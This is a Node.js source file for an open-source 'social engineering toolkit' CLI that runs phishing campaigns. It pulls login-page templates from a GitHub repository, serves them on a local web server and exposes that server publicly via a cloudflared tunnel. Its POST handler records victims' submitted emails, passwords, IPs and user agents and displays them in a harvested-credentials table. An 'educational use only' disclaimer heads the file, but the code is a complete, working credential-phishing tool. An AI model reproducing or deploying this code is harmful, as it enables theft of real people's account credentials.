#!/usr/bin/env node

/*
SocialEngineer - Social Engineering Toolkit
-------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : SocialEngineering - An all-in-one CLI framework for social engineering

License     : Open-source — strictly for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is intended solely for educational use, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you do not own or lack permission to test is illegal.
❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
*/

const os = require('os');
const path = require('path');
const fs = require('fs');
const readline = require('readline');
const { spawnSync, spawn } = require('child_process');
const http = require('http');
const { v4: uuidv4 } = require('uuid');

const db = require('./dbgateway');
// getAttackLogs will be used to fetch all submissions for a uuid
const ui = require('./banner');
const ora = require("ora");

// --- generic helpers -------------------------------------------------------
function askQuestion(prompt) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(prompt, (ans) => {
      rl.close();
      resolve(ans.trim());
    });
  });
}

function promptTargetName() {
  return askQuestion('👉 Enter target name: ');
}

function ensureTemplatesRepo() {
  const home = os.homedir();
  const tmplDir = path.join(home, 'SocialEngineering-Templates');
  if (fs.existsSync(tmplDir)) {
    spawnSync('git', ['-C', tmplDir, 'pull'], { stdio: 'ignore' });
  } else {
    spawnSync('git', ['clone', 'https://github.com/Cappricio-Securities/SocialEngineering-Templates', tmplDir], { stdio: 'ignore' });
  }
  return tmplDir;
}

function listTemplates(dir) {
  if (!fs.existsSync(dir)) return [];
  return fs.readdirSync(dir).filter((f) => {
    if (f.startsWith('.')) return false; // ignore hidden directories
    try {
      return fs.statSync(path.join(dir, f)).isDirectory();
    } catch {
      return false;
    }
  });
}

async function chooseTemplate(templates) {
  ui.clearScreen();
  ui.printBanner();
  ui.showTemplateMenu(templates);
  return askQuestion('🔢 Select template number (or 0 to go back): ');
}

function findLocalIp() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && net.address.startsWith('192.')) {
        return net.address;
      }
    }
  }
  return '127.0.0.1';
}

function checkCloudflared() {
  const proc = spawnSync(process.platform === 'win32' ? 'where' : 'which', ['cloudflared']);
  return proc.status === 0;
}

// start cloudflared tunnel, return public URL or null if something fails
function startCloudflared(port, waitMs = 10000) {
  // spawn detached so the tunnel keeps running after this process exits
  // returns an object { url, pid } or null
  return new Promise((resolve) => {
    let url = null;
    let resolved = false;
    let proc;
    let allOutput = '';

    const finish = (u) => {
      if (!resolved) {
        resolved = true;
        resolve({ url: u, pid: proc && proc.pid });
      }
    };

    try {
      proc = spawn(
        'cloudflared',
        ['tunnel', '--url', `http://127.0.0.1:${port}`],
        { detached: true, stdio: ['ignore', 'pipe', 'pipe'] }
      );
     
    } catch (err) {
      console.log('[!] failed to spawn cloudflared:', err.message);
      return resolve(null);
    }

    // give it some seconds to emit its public URL
    const to = setTimeout(() => {
      console.log(`[!] cloudflared startup timed out after ${waitMs}ms (process left running)`);
      if (!resolved) finish(null); // don't kill–let it run for diagnostics or manual use
    }, waitMs);

    const onData = (data) => {
      const text = data.toString();
      allOutput += text;
      const m = text.match(/https:\/\/[\w\-]+\.trycloudflare\.com/);
      if (m && !resolved) {
        url = m[0];
        clearTimeout(to);
        finish(url);
      }
    };

    proc.stdout.on('data', onData);
    proc.stderr.on('data', onData);

    proc.on('error', (err) => {
      console.log('[!] cloudflared error event:', err && err.message);
      clearTimeout(to);
      finish(null);
    });
    proc.on('exit', (code, sig) => {
      if (!resolved) {
        console.log(`[!] cloudflared exited early (code=${code} sig=${sig})`);
        if (allOutput) {
          console.log('[!] cloudflared output:\n' + allOutput.trim());
        }
      }
      clearTimeout(to);
      finish(url);
    });

    proc.unref(); // allow parent to exit
  });
}

function startStaticServer(folder, port, uuid, meta = {}) {
  const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', (chunk) => (body += chunk));
      req.on('end', () => {
        // parse urlencoded form
        const params = new URLSearchParams(body);
        const email = params.get('email') || params.get('username') || '';
        const password = params.get('password') || '';

        // determine client IP, prefer x-forwarded-for, fall back to real-ip or socket
        let ip =
            req.headers['x-forwarded-for']?.split(',')[0] ||
            req.headers['x-real-ip'] ||
            req.socket.remoteAddress || '';
        if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();

        db.logAttackVisit(uuid, {
          ip,
          useragent: req.headers['user-agent'],
          filename: req.url,
          ts: Date.now(),
          email,
          password
        });

        // fetch all visits for this uuid and print them
        const logs = db.getAttackLogs(uuid).map(l => ({
          email: l.email || '<none>',
          password: l.password || '<none>',
          ip: l.ip || '<none>',
          useragent: l.useragent || '<none>',
          timestamp: l.at || l.timestamp
        }));
        ui.showCredsTable(meta, logs);

        res.writeHead(302, { Location: '/' });
        res.end();
      });
      return;
    }

    // drop query string when resolving files (eg. /?uuid=...)
    const cleanUrl = req.url.split('?')[0] || '/';
    const filePath = path.join(folder, cleanUrl === '/' ? '/index.html' : cleanUrl);
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        return res.end('Not found');
      }
      res.writeHead(200);
      res.end(data);
    });
  });

  return new Promise((resolve) => {
    server.listen(port, () => resolve(server));
  });
}

function formatTimestamp(date) {
  return date.toISOString().replace('T', ' ').split('.')[0];
}

// --- primary flow ---------------------------------------------------------
async function startNewAttack() {
  const target = await promptTargetName();
  if (!target) return;

  // clear previous menu and show banner before template selection
  ui.clearScreen();
  ui.printBanner();

  const tmplDir = ensureTemplatesRepo();
  const templates = listTemplates(tmplDir);
  if (templates.length === 0) {
    console.log('[!] no templates found');
    return;
  }

  while (true) {
    const choice = await chooseTemplate(templates);
    if (choice === '0') return; // back to menu
    if (choice.toLowerCase() === 'x') break;
    const idx = parseInt(choice, 10) - 1;
    if (idx < 0 || idx >= templates.length) continue;

    const selected = templates[idx];
    const uuid = uuidv4();
    const now = new Date();

    db.createAttack({ uuid, datetime: now.toISOString(), name: target, template: selected, type: 'phishing' });
    await launchAttack({ uuid, name: target, template: selected });
    break; // after ending attack return to submenu
  }
}


// choose an existing attack from the list, returns index or null
async function chooseExistingAttack(attacks) {
  ui.clearScreen(); ui.printBanner();

  ui.showAttackList(attacks);
  const choice = await askQuestion('🔢 Select attack number (or 0 to go back): ');
  if (choice === '0') return null;
  const idx = parseInt(choice, 10) - 1;
  if (idx < 0 || idx >= attacks.length) return null;
  return idx;
}

// launch a server for an existing attack record
async function launchAttack({ uuid, name, template }) {
  ui.clearScreen();
  ui.printBanner();
  const spin = ora("Starting phishing server").start();

  setTimeout(() => {
      spin.succeed("Server started");
  }, 4000);
  const tmplDir = ensureTemplatesRepo();
  const folder = path.join(tmplDir, template);
  const port = 8090;

  // precompute values needed by both the static server handler and the summary
  const localIp = findLocalIp();
  const cloudflaredInstalled = checkCloudflared();
  let targetUrl = null;

  // start the HTTP server first; it doesn't need targetUrl
  // build a metadata object that we can mutate later; the same object is
  // passed into the server handler so table headers will reflect the tunnel
  // URL once we know it.
  const meta = {
    target: name,
    uuid,
    template,
    localIp,
    targetUrl: null
  };

  const server = await startStaticServer(folder, port, uuid, meta);

  let cfInfo = null;
  if (cloudflaredInstalled) {
    ui.clearScreen();
    ui.printBanner();
  
    cfInfo = await startCloudflared(port);
    if (cfInfo) targetUrl = cfInfo.url;
  }
  if (!targetUrl) {
    const randomSlug = Math.random().toString(36).substring(2, 8);
    targetUrl = `https://${randomSlug}.trycloudflare.com?uuid=${uuid}`;
  }
  // update meta so any later POSTs will include correct URL
  meta.targetUrl = targetUrl;

  ui.showPhishingSummary({
    target: name,
    uuid,
    selected: template,
    localIp,
    port,
    cloudflaredInstalled,
    targetUrl,
    folder,
    createdAt: formatTimestamp(new Date())
  });

  if (cloudflaredInstalled && !targetUrl) {
    console.log('[!] cloudflared started but did not return a public URL, falling back');
  }

  const stop = await askQuestion('');
  if (stop.toLowerCase() === 'x' || stop === '0') {
    server.close();
    if (cfInfo && cfInfo.pid) {
      try { process.kill(cfInfo.pid); } catch (e) { /* ignore */ }
    }
  }
}

async function start() {
  while (true) {
    ui.clearScreen();
    ui.printBanner();

    ui.clearScreen();
    ui.printBanner()
    ui.showAttackMenu();
    const opt = await askQuestion('👉 choice: ');
    if (opt === '0'){ ui.clearScreen(); ui.printBanner(); return;}
    if (opt === '1') {
      await startNewAttack();
    } else if (opt === '2') {
      const attacks = db.getAttacks('phishing');
      if (attacks.length === 0) {
        console.log('[!] no existing phishing attacks');
        await askQuestion('press enter to continue');
        continue;
      }
      const idx = await chooseExistingAttack(attacks);
      if (idx != null) {
        const attack = attacks[idx];
        await launchAttack(attack);
      }
    } else if (opt === '3') {
      const attacks = db.getAttacks('phishing');
      if (attacks.length === 0) {
        console.log('[!] no existing phishing attacks');
        await askQuestion('press enter to continue');
        continue;
      }
      const idx = await chooseExistingAttack(attacks);
      if (idx != null) {
        const attack = attacks[idx];
        const logs = db.getAttackLogs(attack.uuid).map(l => ({
          email: l.email || '<none>',
          password: l.password || '<none>',
          ip: l.ip || '<none>',
          useragent: l.useragent || '<none>',
          timestamp: l.at || l.timestamp
        }));
        ui.clearScreen(); ui.printBanner();
        ui.showCredsTable({
          target: attack.name,
          template: attack.template,
          uuid: attack.uuid
        }, logs);
        await askQuestion('press enter to continue');
      }
    }
  }
}

module.exports = { start, listTemplates, chooseTemplate, startCloudflared,
  // additional helpers (exposed for testing)
  startStaticServer,
  checkCloudflared,
  findLocalIp,
};
